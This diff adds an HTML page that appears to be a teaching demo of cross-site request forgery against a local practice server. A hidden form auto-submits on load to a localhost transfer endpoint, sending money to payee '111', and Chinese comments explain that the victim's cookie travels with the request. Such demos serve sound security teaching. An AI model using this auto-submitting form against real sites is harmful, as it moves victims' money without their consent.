@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>你被骗了</title>
+</head>
+
+<body>
+    <!-- 偷偷转走你的钱： 3001端口的cookie被自动带去了3001的服务器 -->
+    <!-- 表单没有跨域问题 -->
+    <form name="sneak" action="http://localhost:3001/api/transfer1" method="post">
+        <input type="text" name="payee" value="111" />
+        <input type="text" name="amount" value="100" />
+    </form>
+</body>
+<script>
+    window.onload = function () {
+        
+        document.sneak.submit(); //通过修改访问接口来防御
+    }
+</script>
+
+</html>
